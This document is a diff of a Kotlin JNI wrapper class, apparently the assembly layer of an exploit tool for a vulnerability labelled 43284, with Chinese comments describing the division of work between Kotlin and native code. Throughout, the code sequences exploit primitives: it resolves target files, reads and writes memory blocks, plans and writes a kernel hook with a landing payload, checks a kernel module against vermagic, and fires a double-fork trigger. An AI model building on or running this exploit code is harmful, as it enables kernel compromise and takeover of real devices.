@@ -1,19 +1,11 @@
 package com.ghostlock.app.jni.cve43284
 
-import com.ghostlock.app.core.generated.HookPlanRequest43284
-import com.ghostlock.app.core.generated.Init43284
-import com.ghostlock.app.core.generated.ModuleCheck43284
-import com.ghostlock.app.core.generated.ReadBlock43284
-import com.ghostlock.app.core.generated.ResolveTarget43284
-import com.ghostlock.app.core.generated.Trigger43284
-import com.ghostlock.app.core.generated.Wait43284
-import com.ghostlock.app.core.generated.WriteBlock43284
-
 /**
  * 43284 的**上层包装**：拼装、想写什么、写到哪、收尾，都放在这里。
  *
  * 分工（用户裁定 2026-10-15）：
- * - [Native43284] 只是 JNI 接口（每个函数一个设备原语，参数是生成的 DTO）；
+ * - [Native43284] 只是 JNI 接口（每个函数一个设备原语；生成 DTO 只在 [Native43284] 内部构造，
+ *   本类只传平参数 —— 2026-10-17 用户指令：装配层不 import `core.generated`）；
  * - 本类承载顺序、条件、循环、镜像切块、目标选择、序号接续与收尾 —— 即「拼装与写目标只在 Kotlin」；
  * - native 里不得新增可放在 Kotlin 的逻辑；若本类做不到，说明**接口能力不足**，改接口（见下）。
  *
@@ -34,8 +26,9 @@ import com.ghostlock.app.core.generated.WriteBlock43284
 class Assembled43284(
     private val handle: Long,
     private val sequence: SequenceContinuation? = null,
-    private val paramsProvider: (() -> Init43284)? = null,
+    private val paramsProvider: (() -> Native43284.SessionParams43284)? = null,
 ) {
+
 
     /** 最近一次调用的具名拒绝（空串表示没有）。 */
     var lastRefusal: String = ""
@@ -54,7 +47,7 @@ class Assembled43284(
     }
 
     /** 建安全关联。参数（SPI/端口/ICV/密钥）由调用方给：本类不猜。 */
-    fun initialize(params: Init43284): Int {
+    fun initialize(params: Native43284.SessionParams43284): Int {
         val refusal = refusalSlot()
         val code = record(Native43284.initialize(handle, params, refusal), refusal)
         if (code == 0) {
@@ -67,12 +60,7 @@ class Assembled43284(
     fun openTarget(path: String, role: Int = ROLE_PATCH1): Long {
         val refusal = refusalSlot()
         val out = LongArray(1)
-        val code = Native43284.resolveTarget(
-            handle,
-            ResolveTarget43284(role = role, path = path.toByteArray(), accessMode = 0),
-            out,
-            refusal,
-        )
+        val code = Native43284.resolveTarget(handle, role, path.toByteArray(), 0, out, refusal)
         record(code, refusal)
         return if (code == 0) out[0] else 0L
     }
@@ -81,7 +69,7 @@ class Assembled43284(
     fun readBlock(ticket: Long, offset: Long): ByteArray? {
         val refusal = refusalSlot()
         val out = ByteArray(BLOCK)
-        val code = Native43284.readBlock(handle, ReadBlock43284(ticket = ticket, offset = offset), out, refusal)
+        val code = Native43284.readBlock(handle, ticket, offset, out, refusal)
         record(code, refusal)
         return if (code == 0) out else null
     }
@@ -91,11 +79,7 @@ class Assembled43284(
         require(block.size == BLOCK) { "一块就是十六字节" }
         val refusal = refusalSlot()
         return record(
-            Native43284.writeBlock(
-                handle,
-                WriteBlock43284(ticket = ticket, offset = offset, block = block),
-                refusal,
-            ),
+            Native43284.writeBlock(handle, ticket, offset, block, refusal),
             refusal,
         )
     }
@@ -265,12 +249,7 @@ class Assembled43284(
     fun hookPlan(symbol: String, guardPolicy: Int = GUARD_POLICY_SKIP): LongArray? {
         val refusal = refusalSlot()
         val out = LongArray(10)
-        val code = Native43284.hookPlan(
-            handle,
-            HookPlanRequest43284(ByteArray(BLOCK) { 0x11 }, symbol.toByteArray(), guardPolicy),
-            out,
-            refusal,
-        )
+        val code = Native43284.hookPlan(handle, ByteArray(BLOCK) { 0x11 }, symbol.toByteArray(), guardPolicy, out, refusal)
         record(code, refusal)
         return if (code == 0) out else null
     }
@@ -302,11 +281,7 @@ class Assembled43284(
     fun moduleCheck(image: ByteArray, kernelVermagic: String): Int {
         val refusal = refusalSlot()
         return record(
-            Native43284.moduleCheck(
-                handle,
-                ModuleCheck43284(moduleImage = image, kernelVermagic = kernelVermagic.toByteArray()),
-                refusal,
-            ),
+            Native43284.moduleCheck(handle, image, kernelVermagic.toByteArray(), refusal),
             refusal,
         )
     }
@@ -314,7 +289,7 @@ class Assembled43284(
     /** 触发（双 fork）。 */
     fun trigger(delayMs: Long): Int {
         val refusal = refusalSlot()
-        return record(Native43284.trigger(handle, Trigger43284(delayMs), refusal), refusal)
+        return record(Native43284.trigger(handle, delayMs, refusal), refusal)
     }
 
     /** 等终态：0 failure / 1 success / 2 inflight（-1 表示调用本身失败）。 */
@@ -331,15 +306,13 @@ class Assembled43284(
         val out = LongArray(1) { -1L }
         Native43284.waitTerminal(
             handle,
-            Wait43284(
-                budgetMs = budgetMs,
-                pollMs = pollMs,
-                successMarker = successMarker.toByteArray(),
-                failureMarker = failureMarker.toByteArray(),
-                inFlightMarker = inFlightMarker.toByteArray(),
-                moduleMarker = moduleMarker.toByteArray(),
-                moduleName = moduleName.toByteArray(),
-            ),
+            budgetMs,
+            pollMs,
+            successMarker.toByteArray(),
+            failureMarker.toByteArray(),
+            inFlightMarker.toByteArray(),
+            moduleMarker.toByteArray(),
+            moduleName.toByteArray(),
             out,
             refusal,
         )
@@ -356,10 +329,10 @@ class Assembled43284(
     }
 
     /** 初始化时收到的那一份参数（只能用一次：读完就被清零）。 */
-    private var sessionParams: Init43284? = null
+    private var sessionParams: Native43284.SessionParams43284? = null
 
     /** @return 一份全新的会话参数（有 provider 时现造；否则退回那一份，只够用一次）。 */
-    private fun freshParams(): Init43284? = paramsProvider?.invoke() ?: sessionParams
+    private fun freshParams(): Native43284.SessionParams43284? = paramsProvider?.invoke() ?: sessionParams
 
     /** 分步拼装拿到的句柄（0 表示没有）。拼装顺序由本类决定。 */
     var targetId: Long = 0L
@@ -523,7 +496,7 @@ class Assembled43284(
     /** 分步：初始化 Access 并记住参数。 */
     fun initializeAccessAndRemember(
         params: com.ghostlock.app.core.generated.AccessParams43284,
-        init: Init43284,
+        init: Native43284.SessionParams43284,
     ): Boolean {
         /* 没有句柄就没得初始化：不许返回 true（2026-10-15 真机暴露的 bug）。 */
         if (accessId == 0L) {
@@ -549,7 +522,7 @@ class Assembled43284(
         image: ByteArray,
         offset: Long,
         width: Long,
-        init: Init43284,
+        init: Native43284.SessionParams43284,
         outcome: LongArray? = null,
     ): Boolean {
         if (accessId == 0L) {
@@ -587,7 +560,7 @@ class Assembled43284(
     }
 
     /** 分步：写钩子（站点一个字 + landing 载荷）。 */
-    fun writeHook(width: Long, init: Init43284): Boolean {
+    fun writeHook(width: Long, init: Native43284.SessionParams43284): Boolean {
         if (accessId == 0L) {
             lastCode = -1
             lastRefusal = "hook:no-handle"
@@ -627,7 +600,7 @@ class Assembled43284(
     fun restoreHook(
         plan: com.ghostlock.app.core.generated.HookPlan43284,
         width: Long,
-        init: Init43284,
+        init: Native43284.SessionParams43284,
     ): Boolean {
         if (accessId == 0L) {
             lastCode = -1
